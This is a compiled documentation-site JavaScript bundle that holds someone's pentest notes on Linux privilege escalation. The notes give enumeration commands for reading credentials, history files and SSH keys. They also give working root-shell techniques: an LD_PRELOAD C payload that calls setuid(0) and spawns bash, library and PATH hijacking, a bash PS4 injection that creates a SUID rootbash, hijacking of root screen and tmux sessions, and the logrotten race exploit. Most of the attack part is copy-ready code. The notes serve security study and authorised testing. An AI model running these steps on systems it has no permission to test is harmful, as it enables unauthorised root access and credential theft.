"use strict";(self.webpackChunkthe_nest_new=self.webpackChunkthe_nest_new||[]).push([[664],{3905:function(e,n,t){t.d(n,{Zo:function(){return c},kt:function(){return m}});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,i=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=p(t),m=r,h=d["".concat(l,".").concat(m)]||d[m]||u[m]||i;return t?a.createElement(h,o(o({ref:n},c),{},{components:t})):a.createElement(h,o({ref:n},c))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var i=t.length,o=new Array(i);o[0]=d;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,o[1]=s;for(var p=2;p<i;p++)o[p]=t[p];return a.createElement.apply(null,o)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},9166:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return c},default:function(){return d}});var a=t(7462),r=t(3366),i=(t(7294),t(3905)),o=["components"],s={sidebar_position:1},l="Linux Privilege Escalation",p={unversionedId:"cybersecurity/pentest-notes/privilege-escalation/linux",id:"cybersecurity/pentest-notes/privilege-escalation/linux",title:"Linux Privilege Escalation",description:"Enumeration",source:"@site/docs/cybersecurity/pentest-notes/privilege-escalation/linux.md",sourceDirName:"cybersecurity/pentest-notes/privilege-escalation",slug:"/cybersecurity/pentest-notes/privilege-escalation/linux",permalink:"/the-nest/docs/cybersecurity/pentest-notes/privilege-escalation/linux",editUrl:"https://github.com/crystalwwj/the-nest/edit/main/docs/cybersecurity/pentest-notes/privilege-escalation/linux.md",tags:[],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1},sidebar:"tutorialSidebar",previous:{title:"SMB, LDAP, Kerberos",permalink:"/the-nest/docs/cybersecurity/pentest-notes/foothold/smb"},next:{title:"Intro",permalink:"/the-nest/docs/cybersecurity/random-notes/intro"}},c=[{value:"Enumeration",id:"enumeration",children:[{value:"System Info",id:"system-info",children:[],level:3},{value:"Finding InTesRestInG files and folders",id:"finding-intesresting-files-and-folders",children:[],level:3},{value:"SUID/SGID and capabilities",id:"suidsgid-and-capabilities",children:[],level:3},{value:"Exploiting dependencies",id:"exploiting-dependencies",children:[{value:"SUDO",id:"sudo",children:[],level:4},{value:"SUID/SGID File paths",id:"suidsgid-file-paths",children:[],level:4}],level:3}],level:2},{value:"Kernel Exploits",id:"kernel-exploits",children:[],level:2},{value:"Others",id:"others",children:[{value:"Abusing stuff running as ROOT",id:"abusing-stuff-running-as-root",children:[],level:3},{value:"Container escape",id:"container-escape",children:[],level:3}],level:2}],u={toc:c};function d(e){var n=e.components,t=(0,r.Z)(e,o);return(0,i.kt)("wrapper",(0,a.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"linux-privilege-escalation"},"Linux Privilege Escalation"),(0,i.kt)("h2",{id:"enumeration"},"Enumeration"),(0,i.kt)("p",null,"My flow:"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"check system info for anything valuable",(0,i.kt)("ol",{parentName:"li"},(0,i.kt)("li",{parentName:"ol"},"current user's permissions and capabilities?"),(0,i.kt)("li",{parentName:"ol"},"readable sensitive files? writable locations?"),(0,i.kt)("li",{parentName:"ol"},"exploitable cronjobs?"),(0,i.kt)("li",{parentName:"ol"},"exploitable running processes or applications, ex: webapps with writable folders?"),(0,i.kt)("li",{parentName:"ol"},"SUID/SGID?"),(0,i.kt)("li",{parentName:"ol"},"kernel exploits (last resort)"))),(0,i.kt)("li",{parentName:"ol"},"enumerate local files",(0,i.kt)("ol",{parentName:"li"},(0,i.kt)("li",{parentName:"ol"},"files with credentials or sensitive stuff",(0,i.kt)("ol",{parentName:"li"},(0,i.kt)("li",{parentName:"ol"},"SSH keys"),(0,i.kt)("li",{parentName:"ol"},"app, database, and other config files"),(0,i.kt)("li",{parentName:"ol"},"history files: ",(0,i.kt)("inlineCode",{parentName:"li"},"cat ~/.*history")))),(0,i.kt)("li",{parentName:"ol"},"exploitable executable files? ")))),(0,i.kt)("h3",{id:"system-info"},"System Info"),(0,i.kt)("p",null,"Always check system info, including machine architecture (for building and choosing exploits), users and groups, running processes and automated tasks, permissions of files and folders, etc."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'# machine info\nwhoami\nhostname\nuname -a\n/etc/issue\n/proc/version\n\n# check applications and packages\ndpkg -l\n\n# kernel modules\nlsmod\n/sbin/modinfo <pkgname>\n\n# check users\ncat /etc/passwd\n\n# check cron \ncat /etc/crontab \ngrep "CRON" /var/log/cron.log\n\n# check disk partition and devices \ncat /etc/fstab \ncat /bin/lsblk\n\n# check processes and running applications\nps -aux \n./pspy64\nservice --status-all\n\n# check network\ncat /sbin/route\ncat /proc/net/tcp\nnetstat -tunlp\nss -anp\n\n# Any unusually short timers?\nsystemctl list-timers --all\n')),(0,i.kt)("h3",{id:"finding-intesresting-files-and-folders"},"Finding InTesRestInG files and folders"),(0,i.kt)("p",null,"Always checks what you can read or write!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"# check for write permissions on anything \nfind / -writable -type d 2>/dev/null \nfind / -writable -type f 2>/dev/null | grep -v '/proc\\|/run\\|/var\\|/sys'\nfind / -perm -u=s -type f 2>/dev/null \n\n# check files owned by a user and exclude certain directories\nfind / -user sysadm -ls 2>/dev/null | grep -v '/proc\\|/run'\n\n# finds logs readable by this user\nfind /var/log -readable -ls\n\n# find files modified between date\nfind / -newermt 2019-03-01 ! -newermt 2019-03-10\n\n# locations that SHOULD usually be empty\nla -lah /opt\nls -lah /srv\n\n# grepping for strings recursively\ngrep -rHa \"192.168.5.2\" /var/log\ngrep -rnw '/var/www/html/admin' -e 'pass'\n")),(0,i.kt)("h3",{id:"suidsgid-and-capabilities"},"SUID/SGID and capabilities"),(0,i.kt)("p",null,"Check if your user has SUID/SGID permissions on anything.\nBest goto: ",(0,i.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/"},"GTFOBins")),(0,i.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,i.kt)("div",{parentName:"div",className:"admonition-heading"},(0,i.kt)("h5",{parentName:"div"},(0,i.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,i.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,i.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"My tip")),(0,i.kt)("div",{parentName:"div",className:"admonition-content"},(0,i.kt)("p",{parentName:"div"},"Sometimes, writing in ",(0,i.kt)("inlineCode",{parentName:"p"},"/tmp")," may cause GTFObins to fail -> write to ",(0,i.kt)("inlineCode",{parentName:"p"},"/dev/shm")," to work! (Perhaps due to permissions)"))),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"# check SUDO\nsudo -l\nls /etc/sudoers\nls /etc/sudoers.d\n\n# find SUID/SGID\nfind / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n\n# get capabilities\nfind / -exec getcap {} \\; 2>/dev/null\n")),(0,i.kt)("p",null,"If you find a non-standard SUID/SGID binary, see below for abusing file paths."),(0,i.kt)("h3",{id:"exploiting-dependencies"},"Exploiting dependencies"),(0,i.kt)("h4",{id:"sudo"},"SUDO"),(0,i.kt)("p",null,"If you can run any programs with sudo, you can try to abuse ",(0,i.kt)("inlineCode",{parentName:"p"},"LD_PRELOAD")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"LD_LIBRARY_PATH"),". ",(0,i.kt)("inlineCode",{parentName:"p"},"LD_PRELOAD")," loads a shared object before any others when a program is run. ",(0,i.kt)("inlineCode",{parentName:"p"},"LD_LIBRARY_PATH")," provides a list of directories where shared libraries are searched for first."),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"Abuse ",(0,i.kt)("inlineCode",{parentName:"strong"},"LD_PRELOAD"))),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'# Step 1: create preload.c with shell-opening code\ncat > preload.c <<EOF\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n        setuid(0);\n        system("/bin/bash -p");\n}\nEOF\n\n# step 2: compile it into a shared object\ngcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/sudo/preload.c\n\n# step 3: sudo run program with shared object\nsudo LD_PRELOAD=/tmp/preload.so program\n')),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"Abuse ",(0,i.kt)("inlineCode",{parentName:"strong"},"LD_LIBRARY_PATH"))),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"# Step 1: check used shared libs\nldd /usr/sbin/apache2\n\n# Step 2: create a shared object with the same name \ngcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c\n\n# Step 3: run program and set load location to controlled directory\nsudo LD_LIBRARY_PATH=/tmp apache2\n")),(0,i.kt)("h4",{id:"suidsgid-file-paths"},"SUID/SGID File paths"),(0,i.kt)("p",null,"For non-standard executables that you have SUID/SGID permissions on, try grepping the strings or use strace to see what binaries are called. You may be able to trick the executable into running your exploit by confusing file paths."),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"TIP 1: If the full path is not specified, try writing an executable in the current directory and export PATH to abuse precedence. ")),(0,i.kt)("p",null,"Example: ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/local/bin/suid-env")," starts an apache server via ",(0,i.kt)("inlineCode",{parentName:"p"},"service apache2 start")," without specifying the full path of executable ",(0,i.kt)("inlineCode",{parentName:"p"},"service"),"\nExploit:  compile our own ",(0,i.kt)("inlineCode",{parentName:"p"},"service")," executable and prepend the PATH variable with the current directory to hijack the accessed env: ",(0,i.kt)("inlineCode",{parentName:"p"},"PATH=.:$PATH /usr/local/bin/suid-env")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Tip 2: The full path IS specified, but Bash version < 4.2-048, we can abuse shell features with names that resemble file paths!")),(0,i.kt)("p",null,"Example: ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/local/bin/suid-env")," starts an apache server via ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/sbin/service apache2 start"),"\nExploit: create and export a shell function to confuse the executable"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"function /usr/sbin/service { /bin/bash -p; }\nexport -f /usr/sbin/service\n")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Tip 3: When Bash version < 4.4, we can run it in debugging mode and use the ",(0,i.kt)("inlineCode",{parentName:"p"},"PS4")," variable for debugging statements.")),(0,i.kt)("p",null,"Exploit: provide the PS4 variable to run arbitrary commands "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2\n\n# run shell with root privileges\n/tmp/rootbash -p\n")),(0,i.kt)("h2",{id:"kernel-exploits"},"Kernel Exploits"),(0,i.kt)("h2",{id:"others"},"Others"),(0,i.kt)("h3",{id:"abusing-stuff-running-as-root"},"Abusing stuff running as ROOT"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"screen"))),(0,i.kt)("p",null,"If screen is running as root, for example:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done\n")),(0,i.kt)("p",null,"Try connecting to root screen with ",(0,i.kt)("inlineCode",{parentName:"p"},"screen -x root/root"),"."),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"tmux"))),(0,i.kt)("p",null,"If tmux is running as root, try connecting to a session with ",(0,i.kt)("inlineCode",{parentName:"p"},"tmux -S /.devs/dev_sess"),"."),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},(0,i.kt)("strong",{parentName:"p"},"logrotate"))),(0,i.kt)("p",null,"Race condition affecting versions 3.8.6, 3.11.0, 3.15.0. If:"),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"logrotate is running as root"),(0,i.kt)("li",{parentName:"ol"},"versions 3.8.6, 3.11.0, 3.15.0"),(0,i.kt)("li",{parentName:"ol"},"you have write permissions on a log directory")),(0,i.kt)("p",null,"then you can use ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/whotwagner/logrotten"},"logrotten"),"! Download, compile, and run the exploit on victim to profit!"),(0,i.kt)("h3",{id:"container-escape"},"Container escape"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"Environment")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"# check if in container\ncat /proc/1/cgroup\n# look for owner of /proc (if root/root then you're in a privileged container)\nls -la /proc\n")),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"Check capabilities"),": might escape if you have one of: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"capsh --print\n")))}d.isMDXComponent=!0}}]);